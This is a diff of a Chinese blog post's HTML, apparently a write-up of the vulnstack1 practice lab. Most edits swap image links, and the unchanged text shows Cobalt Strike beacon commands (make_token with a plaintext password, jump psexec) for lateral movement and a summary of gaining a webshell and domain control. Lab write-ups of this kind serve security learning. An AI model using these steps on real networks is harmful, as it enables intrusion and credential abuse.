@@ -253,8 +253,7 @@
 <img src="http://image.v0w.top/Blog/20200719204025.png" style="zoom:80%;" />
 
 <p>在凭证信息一栏可以清楚查看：</p>
-<img src="http://image.v0w.top/Blog/20200719204108.png" style="zoom: 80%;" />
-
+<p><img src="http://image.v0w.top/Blog/2020-09-25-20200719204108.png"></p>
 <p>如果权限不够可以提权，自带部分提权POC</p>
 <p><img src="http://image.v0w.top/Blog/20200719205029.png"></p>
 <p><img src="http://image.v0w.top/Blog/20200719205118.png"></p>
@@ -307,13 +306,11 @@
 <h3 id="psexec-使用凭证登录其他主机"><a href="#psexec-使用凭证登录其他主机" class="headerlink" title="psexec 使用凭证登录其他主机"></a>psexec 使用凭证登录其他主机</h3><p>前面横向探测已经获取到内网内的其他 <code>Targets</code> 以及读取到的凭证信息</p>
 <p>于是可以尝试使用 <code>psexec</code> 模块登录其他主机</p>
 <p>右键选择一台非域控主机 <code>ROOT-TVI862UBEH</code> 的 <code>psexec</code> 模块：</p>
-<img src="http://image.v0w.top/Blog/20200719223832.png" style="zoom: 67%;" />
-
+<p><img src="http://image.v0w.top/Blog/2020-09-25-20200719223832.png"></p>
 <p>在弹出的窗口中选择使用 <code>god.org</code> 的 <code>Administrator</code> 的凭证信息</p>
 <p>监听器选择刚才创建的 <code>smb beacon</code>，会话也选择对应的 <code>smb beacon</code> 的会话：</p>
-<p><img src="http://image.v0w.top/Blog/20200719224006.png"></p>
-<img src="http://image.v0w.top/Blog/20200719224034.png" style="zoom:67%;" />
-
+<p><img src="http://image.v0w.top/Blog/2020-09-25-20200719224006.png"></p>
+<p><img src="http://image.v0w.top/Blog/2020-09-25-20200719224034.png"></p>
 <p>可以看到分别执行了</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">[*] Tasked beacon to revert token</span><br><span class="line">beacon&gt; make_token GOD.ORG\Administrator V0Wldl19980114</span><br><span class="line">[*] Tasked beacon to create a token for GOD.ORG\Administrator</span><br><span class="line">beacon&gt; jump psexec ROOT-TVI862UBEH smb</span><br></pre></td></tr></table></figure>
 
@@ -326,7 +323,7 @@
 <img src="http://image.v0w.top/Blog/20200719225201.png" style="zoom: 67%;" />
 
 <p>然后在选择令牌处勾选使用当前 <code>token</code> 即可：</p>
-<p><img src="http://image.v0w.top/Blog/20200719225303.png"></p>
+<p><img src="http://image.v0w.top/Blog/2020-09-25-20200719225303.png"></p>
 <h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>我们利用mysql日志写shell或者CMS的模板文件写shell轻松拿下Web服务器，再利用Web服务器作为跳板，去横向收集域内主机信息，并利用窃取的凭证横向移动到其他主机，最终实现整个域的控制。</p>
 <h1 id="0xFF-后记与参考链接"><a href="#0xFF-后记与参考链接" class="headerlink" title="0xFF 后记与参考链接"></a>0xFF 后记与参考链接</h1><p>内网渗透的内容很多，完成这个靶机，也只是管中窥豹，发现需要更多的积累和学习，也很感谢很多师傅的博客和笔记，使得我在练习这个靶机的时候轻松很多（<del>其实也没有，依然很累==</del>）0rz。后面希望能够继续更新这个系列，在内网渗透方面也能不断学习，不断成长。</p>
 <p>参考链接：</p>
@@ -339,7 +336,7 @@
 <li><a target="_blank" rel="noopener" href="https://www.c0bra.xyz/2019/12/14/Cobalt-Strike%E7%B3%BB%E5%88%979/">Cobalt Strike 系列 9</a></li>
 <li>[第三节 SMB Beacon.md](<a target="_blank" rel="noopener" href="https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E4%B8%89%E8%8A%82[SMB">https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/第三节[SMB</a> Beacon].md)</li>
 </ul>
-</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:v0wldl@163.com">V0WKeep3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://v0w.top/2020/07/19/vulnstack1/">http://v0w.top/2020/07/19/vulnstack1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://v0w.top">V0W's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/webshell/">webshell</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044057.png"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044040.png"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/08/05/Redis-getshell/"><i class="fa fa-chevron-left">  </i><span>Redis与getshell</span></a></div><div class="next-post pull-right"><a href="/2020/03/20/TODA-FileUpload-Inclusion-vuln/"><span>通达OA任意文件上传并利用文件包含导致RCE分析</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:v0wldl@163.com">V0WKeep3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://v0w.top/2020/07/19/vulnstack1/">http://v0w.top/2020/07/19/vulnstack1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://v0w.top">V0W's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/webshell/">webshell</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="/img/AlipayQR.png"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="/img/wechatQR.png"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/08/05/Redis-getshell/"><i class="fa fa-chevron-left">  </i><span>Redis与getshell</span></a></div><div class="next-post pull-right"><a href="/2020/03/20/TODA-FileUpload-Inclusion-vuln/"><span>通达OA任意文件上传并利用文件包含导致RCE分析</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
 var verify = 'false' == 'true';
 var record_ip = 'false' == 'true';
 var GUEST_INFO = ['nick','mail','link'];
